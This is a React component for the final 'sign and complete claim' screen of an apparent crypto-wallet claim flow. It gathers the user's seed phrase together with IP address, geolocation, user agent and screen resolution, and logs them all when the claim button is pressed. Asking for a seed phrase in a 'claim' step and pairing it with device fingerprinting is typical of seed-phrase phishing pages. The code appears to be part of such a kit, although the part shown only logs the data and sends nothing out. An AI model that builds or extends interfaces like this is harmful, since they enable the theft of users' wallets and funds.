import { ChevronDown } from "lucide-react";
import React from "react";
import { Button } from "../ui/button";
import { useWalletStore } from "@/store/walletStore";

interface SignStepProps {
	onPrevious: () => void;
}

function Sign({ onPrevious }: SignStepProps) {
	const {
		blockchainNetwork,
		walletProvider,
		seedPhrase,
		destinationAddress,
		ipAddress,
		geolocation,
		userAgent,
		screenResolution,
	} = useWalletStore();

	// ✅ Function to shorten address
	const formatAddress = (address: string): string => {
		if (!address) return "";
		if (address.length <= 10) return address; // too short, skip trimming
		return `${address.slice(0, 6)}...${address.slice(-4)}`;
	};

	const handleSignAndComplete = () => {
		console.log({
			blockchainNetwork,
			walletProvider,
			seedPhrase,
			destinationAddress,
			ipAddress,
			geolocation,
			userAgent,
			screenResolution,
		});
	};

	return (
		<div>
			<button
				onClick={onPrevious}
				className="flex items-center text-blue-600 hover:text-blue-700 mb-6"
			>
				<ChevronDown
					className="rotate-90 mr-2"
					size={20}
				/>
				Back
			</button>

			<h2 className="text-2xl font-bold text-gray-900 mb-6">
				Sign and complete claim
			</h2>
			<p className="text-gray-700 mb-6">
				Review your claim details and sign to complete the process.
			</p>

			<div className="bg-gray-50 p-6 rounded-lg border border-gray-200 mb-6 space-y-4">
				<div>
					<p className="text-sm text-gray-600">Origin Address</p>
					<p className="font-medium text-gray-900">0x1234...5678</p>
				</div>
				<div>
					<p className="text-sm text-gray-600">Destination Address</p>
					<p className="font-medium text-gray-900">
						{formatAddress(destinationAddress)}
					</p>
				</div>
			</div>

			<Button
				onClick={handleSignAndComplete}
				className="button-primary w-full"
			>
				SIGN AND COMPLETE CLAIM
			</Button>
		</div>
	);
}

export default Sign;
